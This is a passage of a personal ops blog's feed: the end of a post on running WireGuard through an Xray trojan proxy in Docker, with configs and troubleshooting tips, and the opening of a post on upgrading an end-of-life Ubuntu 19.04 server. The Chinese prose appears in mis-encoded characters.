class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ <code>config.json</code> è¿™ä¹ˆå†™ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;wireguard&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> æœ¬åœ°ä»£ç†ç«¯å£ä¾‹å¦‚<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dokodemo-door&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> æœ¬åœ°ä»£ç†ç«¯å£ä¾‹å¦‚<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;followRedirect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„å¯†ç &quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/ä½ çš„å­è·¯å¾„&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;ä½ çš„åŸŸå&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>æ„å»ºè¿è¡Œï¼Œè¿™é‡Œç›´æ¥è®©å®¹å™¨ä½¿ç”¨æœ¬åœ°ç½‘ç»œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t wg-xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=wg-xray --network=host wg-xray</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸè¿æ¥ï¼Œå”¯ä¸€çš„é—®é¢˜æ˜¯å»¶è¿Ÿå¯èƒ½ä¼šç›¸å¯¹æ¯”è¾ƒé«˜ï¼š</p><p><img src="https://s2.loli.net/2024/11/08/Ne5SUfJXy1DGTMi.png"></p><h1 id="0x05-å¯èƒ½é‡åˆ°çš„é—®é¢˜"><a href="#0x05-å¯èƒ½é‡åˆ°çš„é—®é¢˜" class="headerlink" title="0x05. å¯èƒ½é‡åˆ°çš„é—®é¢˜"></a>0x05. å¯èƒ½é‡åˆ°çš„é—®é¢˜</h1><h2 id="å®¢æˆ·ç«¯èƒ½æ¡æ‰‹ä½†æ— æ³•è¿æ¥å…¶ä»–ç»ˆç«¯ï¼Œwg-show-æ˜¾ç¤º-allowed-ips-none"><a href="#å®¢æˆ·ç«¯èƒ½æ¡æ‰‹ä½†æ— æ³•è¿æ¥å…¶ä»–ç»ˆç«¯ï¼Œwg-show-æ˜¾ç¤º-allowed-ips-none" class="headerlink" title="å®¢æˆ·ç«¯èƒ½æ¡æ‰‹ä½†æ— æ³•è¿æ¥å…¶ä»–ç»ˆç«¯ï¼Œwg show æ˜¾ç¤º allowed ips: (none)"></a>å®¢æˆ·ç«¯èƒ½æ¡æ‰‹ä½†æ— æ³•è¿æ¥å…¶ä»–ç»ˆç«¯ï¼Œwg show æ˜¾ç¤º <code>allowed ips: (none)</code></h2><p>åœ¨å¤šè®¾å¤‡è¿æ¥åˆ°åŒä¸€ç½‘ç»œæ—¶å¯èƒ½å‡ºç°ï¼Œå®¢æˆ·ç«¯æ— æ³•è¿æ¥åˆ°åŒ…æ‹¬æœåŠ¡ç«¯åœ¨å†…çš„å…¶ä»–ç»ˆç«¯ï¼Œ <em>ä½†æ˜¯å¯èƒ½ä¼šæœ‰ä¸€ä¸ªå¥‡å¼‚ç°è±¡æ˜¯ä»…æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯èƒ½æ­£å¸¸è¿æ¥</em> ï¼š</p><p><img src="https://s2.loli.net/2024/10/21/4povIUfe3JaiyMb.png"></p><p>å‡ºç°è¿™ç§æƒ…å†µçš„åŸå› å¯èƒ½æ˜¯å› ä¸º <strong>IP å†²çª</strong> ï¼Œå¤§æ¦‚åŸå› æ˜¯å®¢æˆ·ç«¯ä¹‹é—´çš„ IP ç›¸äº’ overlap äº†ï¼Œä»è€Œåªæœ‰å…¶ä¸­ä¸€ä¸ªèƒ½å¤Ÿæ­£å¸¸å·¥ä½œ</p><p>æœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆæ˜¯ <strong>æŠŠå®¢æˆ·ç«¯çš„å­ç½‘æ©ç  è®¾ä¸º &#x2F;32</strong> ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = å®¢æˆ·ç«¯ç§é’¥<br><span class="hljs-attr">Address</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.10</span>/<span class="hljs-number">32</span><br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = æœåŠ¡ç«¯å…¬é’¥<br><span class="hljs-attr">Endpoint</span> = æœåŠ¡ç«¯å…¬ç½‘IPæˆ–åŸŸå:æœåŠ¡ç«¯é…ç½®çš„ç«¯å£<br><span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PersistentKeepalive</span> = <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„æœåŠ¡ç«¯é…ç½®ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">Address</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PostUp</span>   = iptables -A FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="hljs-attr">PreDown</span> = iptables -D FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="hljs-attr">ListenPort</span> = æœåŠ¡ç«¯é…ç½®çš„ç«¯å£<br><span class="hljs-attr">PrivateKey</span> = æœåŠ¡ç«¯ç§é’¥<br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = å®¢æˆ·ç«¯å…¬é’¥<br><span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.10</span>/<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®-WireGuard-åæ— æ³•è§£æåŸŸåï¼Œä½†å¯ä»¥é€šè¿‡-IP-è¿›è¡Œè®¿é—®"><a href="#é…ç½®-WireGuard-åæ— æ³•è§£æåŸŸåï¼Œä½†å¯ä»¥é€šè¿‡-IP-è¿›è¡Œè®¿é—®" class="headerlink" title="é…ç½® WireGuard åæ— æ³•è§£æåŸŸåï¼Œä½†å¯ä»¥é€šè¿‡ IP è¿›è¡Œè®¿é—®"></a>é…ç½® WireGuard åæ— æ³•è§£æåŸŸåï¼Œä½†å¯ä»¥é€šè¿‡ IP è¿›è¡Œè®¿é—®</h2><p>å¯èƒ½æ˜¯ DNS è§£æå‡ºç°é—®é¢˜ï¼Œåœ¨å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶å½“ä¸­ä½ å¯èƒ½ä¼š <em>ä¹ æƒ¯æ€§</em> é¢å¤–é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">DNS</span> = <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span><br></code></pre></td></tr></table></figure><p>è¿™ä¼šè¦†ç›–åŸæœ‰ DNS é…ç½®ï¼Œä½† DNS æœåŠ¡å™¨æœªå¿…æ˜¯å¯è¾¾çš„ï¼ˆ <del>åŸå› æ‡‚çš„éƒ½æ‡‚</del> ï¼‰ï¼Œæœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆæ˜¯åˆ é™¤ DNS é…ç½®æˆ–æ˜¯æ›´æ”¹æˆå…¶ä»–çš„å¯ç”¨çš„ DNS æœåŠ¡å™¨ï¼ˆä¾‹å¦‚ <code>114.114.114.114</code> ï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¾™å“¥å°±æ˜¯é¾™ï¼æƒ¹å•Šï¼&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="è¿ç»´" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="VPN" scheme="https://arttnba3.github.io/tags/VPN/"/>
    
    <category term="WireGuard" scheme="https://arttnba3.github.io/tags/WireGuard/"/>
    
  </entry>
  
  <entry>
    <title>ã€OPS.0x03ã€‘å°† EOL çš„ Ubuntu å‡çº§ä¸º LTS ç‰ˆæœ¬</title>
    <link href="https://arttnba3.github.io/2024/09/23/OPS-0X03-OLD_UBUNTU_EOL_RELEASE_UPGRADE/"/>
    <id>https://arttnba3.github.io/2024/09/23/OPS-0X03-OLD_UBUNTU_EOL_RELEASE_UPGRADE/</id>
    <published>2024-09-23T09:09:09.000Z</published>
    <updated>2024-10-10T07:04:08.727Z</updated>
    
    <content type="html"><![CDATA[<p>æ¬¸ä½ æ€ä¹ˆæ­»äº†ï¼ˆæŒ‡ EOL Releaseï¼‰</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ€è¿‘ç¬”è€…æ‰‹ä¸Šåˆå¤šäº†å°æœåŠ¡å™¨çš„ä½¿ç”¨æƒï¼ŒæŒ‰ç…§æƒ¯ä¾‹æ¯æ¬¡ç™»å…¥ä¸€å°æ–°çš„æœåŠ¡å™¨é¦–å…ˆè¦åšçš„ç¬¬ä¸€ä»¶äº‹è‡ªç„¶æ˜¯å¾—å…ˆè·‘è·‘ <code>neofetch</code> çœ‹çœ‹å®åŠ›ï¼Œä½†æ˜¯å‘ç°æ²¡æ³•å®‰è£…è½¯ä»¶åŒ…ï¼š</p><p><img src="https://s2.loli.net/2024/10/10/i8YqyG3QZ6V5tUk.png"></p><p>ä¹Ÿæ²¡æ³•æ‰“ <code>update &amp; upgrade</code> çš„ç»„åˆæ‹³ï¼Œå› ä¸ºè¿™æ˜¯é LTS çš„å¯¿å‘½åªæœ‰çŸ­çŸ­ 9 ä¸ªæœˆçš„ <code>Ubuntu 19.04 Disco</code> ç‰ˆæœ¬ï¼š</p><p><img src="https://s2.loli.net/2024/10/10/dUApLxgq8XSzHrM.png"></p><p>è™½ç„¶ç¬”è€…ä¸å¤ªç†è§£ä¸ºä»€ä¹ˆä¼šæœ‰è¿ç»´åœ¨æœåŠ¡å™¨ä¸Šå®‰è£…è¿™ç§çŸ­å‘½ç‰ˆæœ¬ï¼Œä½†æ˜¯ <strong>æ–°è½¯ä»¶åŒ…éƒ½æ²¡æ³•å®‰çš„æœåŠ¡å™¨è‡ªç„¶æ˜¯æ²¡æ³•ç”¨çš„</strong> ï¼ˆ <del>éš¾é“çœŸæœ‰äººåœ¨æœåŠ¡å™¨ä¸Šå°±ç”¨ä¸€ä¸ªè‡ªå¸¦çš„ gcc ç”¨åˆ°æ­»ï¼Ÿ</del> ï¼‰ï¼Œå› æ­¤å½“åŠ¡ä¹‹æ€¥æ˜¯å…ˆå‡çº§åˆ°ä¸‹ä¸€ä¸ªå¯ç”¨ç‰ˆæœ¬ï¼ˆé€šå¸¸æ˜¯æœ€è¿‘çš„ä¸€ä¸ª LTS ç‰ˆæœ¬ï¼‰ï¼Œä½†æ˜¯å½“ç¬”è€…è¿è¡Œ <code>sudo do-release-upgrade</code> çš„æ—¶å€™æœåŠ¡å™¨å¯¹ç¬”è€…è¯´ <strong>åˆ«æ€¥</strong> ï¼š</p><p><img src="https://s2.loli.net/2024/10/10/nWCzB74GvqxFi1Y.png"></p><p>å› æ­¤è¿™ç¯‡åšå®¢ç®€å•è®°å½•ä¸€ä¸‹æ€ä¹ˆæ¢å¤çŸ­å‘½ Ubuntu ç‰ˆæœ¬çš„å¯ç”¨æ€§å¹¶æ­£å¸¸å‡çº§åˆ°ä¸‹ä¸€ä¸ªé•¿å‘½ç‰ˆæœ¬ï¼ˆæŒ‡ <code>long-term support</code> ï¼‰</p><blockquote><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¤§å®¶éƒ½åº”è¯¥åœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨ä¼ä¸šçº§çš„ Linux å‘è¡Œç‰ˆ openSUSE Leap ï¼ˆæˆ–æ˜¯ Slowrollï¼‰ï¼Œè€Œä¸æ˜¯è«åå…¶å¦™å®‰ä¸€ä¸ªçŸ­å‘½çš„ Ubuntu ç‰ˆæœ¬ï¼šï¼‰</p></blockquote><h1 